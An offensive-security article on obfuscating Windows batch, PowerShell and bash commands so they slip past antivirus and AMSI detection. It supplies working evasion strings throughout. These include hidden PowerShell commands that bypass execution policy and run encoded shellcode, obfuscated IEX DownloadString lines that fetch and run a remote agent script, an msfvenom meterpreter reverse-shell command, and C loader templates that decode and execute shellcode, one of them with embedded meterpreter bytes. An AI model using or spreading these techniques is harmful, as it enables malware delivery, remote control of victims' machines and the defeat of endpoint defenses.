![banner](http://i.cubeupload.com/1Kopfs.jpg)

      This article contains a list of simple obfuscation technics that can be used into obfuscating system
      call's like (powershell.exe -EncodedCommand OR cmd.exe /c start /MIN) in one attempt to bypass AV's
      AMSI and DEP detection mechanisms, why? let assume we have crypted our shellcode with one AES master
      key, and the AV vendor can't read inside the crypted shellcode to determine if there actions are good
      or bad, in this ocasion the AV vendor also looks for system call's that may reveal malicious actions.

![detection pic](http://i.cubeupload.com/pLllwr.jpg)

<br />

      SPECIAL NOTE:
        remember that if we chose to use the 'batch' obfuscation technic, then it will only work in MS-DOS
        interpreter (cmd.exe or file.bat), If we use one 'batch' special character in powershell terminal
        console, then the powershell interpreter will not be able to escape the special character.

**Bad character sellection** [ batch escape character -used- in powershell interpreter ]
![bad character sellection](http://i.cubeupload.com/5bsI07.jpg)

**Good character sellection** [ powershell special character used in powershell interpreter ]
![powershell obfuscation](http://i.cubeupload.com/36MUH2.jpg)

---

<br /><br /><br /><br /><br />

## Batch Obfuscation

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **batch special character: ^** <br />

- String obfuscated<br />

      cm^d.e^xe /c po^w^er^shel^l.ex^e -n^op -w^i^nd h^idd^en -Ex^e^c B^yp^a^ss -no^n^i -en^c $shellcode

---

- Any formula under the **batch interpreter** can be start with the follow special characters: **@** or **=** or **,** or **;**

      =cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      @cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ,cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

      ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

---

- We can also **pipe** commands to avoid detection

      echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode

![pipe commands](http://i.cubeupload.com/Ulus3M.jpg)

---

- String command to obfuscate<br />
`cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />

- Using one batch local variable to serve as our **master key** (%varObj%) **file: template.bat**<br />

      @echo off
      SET varObj=abcdefghijlmnopqrstuvxzkyW0123456789ABCDEFGHIJLMNOPQRSTUVXZKYW
      %varObj:~2,1%%varObj:~11,1%%varObj:~3,1%.exe /c %varObj:~14,1%%varObj:~13,1%%varObj:~25,1%%varObj:~4,1%%varObj:~16,1%%varObj:~17,1%%varObj:~7,1%%varObj:~6,1%%varObj:~10,1%%varObj:~10,1%.exe -nop -%varObj:~25,1%%varObj:~8,1%%varObj:~3,1%%varObj:~3,1%%varObj:~4,1%%varObj:~12,1% -%varObj:~40,1%%varObj:~21,1%%varObj:~4,1%%varObj:~2,1% %varObj:~37,1%%varObj:~24,1%%varObj:~14,1%%varObj:~0,1%%varObj:~17,1%%varObj:~17,1% -noni -%varObj:~4,1%%varObj:~12,1%%varObj:~2,1% $shellcode
      exit

![batch obfuscation](http://i.cubeupload.com/5gkOX8.jpg)

- Description of %varObj% master_key:<br />
https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/pedro-Wandoelmo-key.md

---


<br /><br /><br />

## Bash Obfuscation

- String command to obfuscate<br />
`whoami`<br />
The above string can be obfuscated using **bash special characters: '** or **\\** or **$@**<br />

- String obfuscated<br />

      w'h'o'am'i

      w\h\o\am\i

      w$@h$@o$@am$@i

      w$@h\o$@am\i <-- using all 3 methods together 

![3 special characters](http://i.cubeupload.com/tLBdbW.png)

---

<br /><br /><br />

## Powershell Obfuscation

- String command to obfuscate<br />
`powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode`<br />
The above string can be obfuscated using the **powershell special character: `**<br />

- String obfuscated<br />

      po`w`er`shel`l.ex`e -n`op -w`i`nd h`idd`en -Ex`e`c B`yp`a`ss -no`n`i -en`c $shellcode

---

- String command to obfuscate<br />
`powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`<br />
The above string can be obfuscated using **powershell special characters:** **`** and **+** and **$var** and **'**<br />

- String obfuscated<br />

      $get="N`et.Web`Cli`ent"
      powershell.exe IEX (New-Object $get).D`ow`nloa`dSt`rin`g('h'+'ttp'+':'+'//'+'192.168'+'.1.71/agent.ps1')

---

- Using an **batch** local variable inside the **powershell interpreter**

      cmd.exe /c "set var=Get-Date && cmd.exe /c echo %var%^" | powershell.exe

![powershell obfuscation](http://i.cubeupload.com/uDdG3G.jpg)

- More Obfuscated using powershell **`** and batch **^** special characters

      c`m`d.e`xe /c "s^Et va^r=Get-Date && c^md^.e^xe /c e^ch^o %var%^" | power`shel`l.e`x`e

![powershell obfuscation](http://i.cubeupload.com/G6rj4M.jpg)

---

- Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º,15º and 25º characters
from $env:comspec variable and use the **-Join ''** operator to take the arraw and convert it to a string.

      $env:comspec[4,15,25]-Join '' (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')

![powershell obfuscation](http://i.cubeupload.com/CIbrFI.jpg)

---

- Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join ''** it back again

      $cmdWithDelim = "(New-Object Net.We~~bClient).Downlo~~adString('http://192.168.1.71/agent.ps1')";IEX ($cmdWithDelim.Split("~~") -Join '') | IEX

![powershell obfuscation](http://i.cubeupload.com/wAZr7K.jpg)

---

<br /><br /><br />

## C to ANCII Obfuscation

- Encoding shellcode from **C** to **ANCII**

      \x8b\x5a\x00\x27\x0d\x0a  <-- C shellcode

      8b5a00270d0a              <-- ANCII shellcode

---

- Build shellcode in **C** format using msfvenom and escaping **bad chars** (-b '\x0a\x0d')

      msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -b '\x0a\x0d' -f c -o shell.txt

- **Parsing** shellcode data (from C to ANCII)

      # store parsed data into '$store' bash local variable
      store=`cat shell.txt | grep -v '=' | tr -d ';' | tr -d '\"' | tr -d '\\' | tr -d 'x' | tr -d '\n'`

- **template.c** to be injected with generated shellcode

      #include
      #include
      #include
      #include
      #include
      #include
      #include

      <stdio.h>
      <stdlib.h>
      <unistd.h>
      <string.h>
      <windows.h>
      <tchar.h>
      <stdlib.h>

      void exec_mycode(unsigned char *mycode)
      {
      int (*funct)();
         funct = (int (*)()) mycode;
         (int)(*funct)();
      }

      // return pointer to mycode
      unsigned char* decode_mycode(unsigned char *buffer, unsigned char *mycode, int size)
      {
      int j=0;
         mycode=malloc((size/2));
         int i=0;
      do
      {
      unsigned char temp[3]={0};
         sprintf((char*)temp,”%c%c”,buffer[i],buffer[i+1]);
         mycode[j] = strtoul(temp, NULL, 16);
         i+=2;
         j++;
      } while(i<size);
         return mycode;
      }
         int main (int argc, char **argv)
      {
         unsigned char *mycode;

      unsigned char buffer[]=
      "INSERT_SHELLCODE_HERE";

      int size = sizeof(buffer);
         mycode = decode_mycode(buffer,mycode,size);
         exec_mycode(mycode);
      }


<br />

- **Inject** parsed shellcode into **template.c**

      # inject shellcode into template.c using SED bash command
      sed -i "s/INSERT_SHELLCODE_HERE/$store/" template.c


- Compile template.c with **GCC** software to **.exe**

      gcc.exe template.c -o agent.exe

---


<br /><br /><br />

## Bypass the scan engine (daniel sauder: avet)

      This next technic writes a file to disk before executing shellcode into target ram ..
      'Template taken from Avet anti-virus evasion tool presented in blackhat 2017'.

---

![avet bypass](http://i.cubeupload.com/ub18vo.png)

---

<br />

**template.c** from AVET<br />


      #include <stdio.h>
      #include <stdlib.h>
      #include <unistd.h>
      #include <string.h>
      #include <windows.h>
      #include <tchar.h>
      #include <stdlib.h>
      #include <strsafe.h>

      void exec_mycode(unsigned char *mycode)
      {
        int (*funct)();
        funct = (int (*)()) mycode;
        (int)(*funct)();
      }


      int main (int argc, char **argv)
      {
      /*
      msfvenom -p windows/meterpreter/reverse_https lhost=192.168.153.149 lport=443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
      */

      unsigned char buffer[]= 
      "\xda\xcc\xba\x6f\x33\x72\xc4\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
      "\x75\x31\x56\x18\x83\xc6\x04\x03\x56\x7b\xd1\x87\x38\x6b\x97"
      "\x68\xc1\x6b\xf8\xe1\x24\x5a\x38\x95\x2d\xcc\x88\xdd\x60\xe0"
      "\xe9\x88\xb7\xf5\xbc\x2b\x91\x9f\xbe\x78\xe1\xb5";
	
      /*
      Here is the bypass. A file is written, this bypasses the scan engine
      */
        HANDLE hFile;
	hFile= CreateFile(_T("hello.txt"), FILE_READ_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) 
		exit(0);

	exec_mycode(buffer);
      }

---

<br /><br /><br />

### Special thanks to:
**@danielbohannon** **@Andy Green** **@404death**<br />
**@Wandoelmo Silva** **@daniel sauder(avet)**

<br />


### Referencies
https://twitter.com/404death<br />
https://github.com/govolution/avepoc<br />
https://github.com/danielbohannon/Invoke-Obfuscation<br />
https://www.sans.org/summit-archives/file/summit-archive-1492186586.pdf<br />
https://blog.varonis.com/powershell-obfuscation-stealth-through-confusion-part-i/<br />

<br />

**Author: r00t-3xp10it**<br />
**'If you know more of this technics, fell free to report them'  ^_^**<br />
# Suspicious Shell Activity (red team) @2018
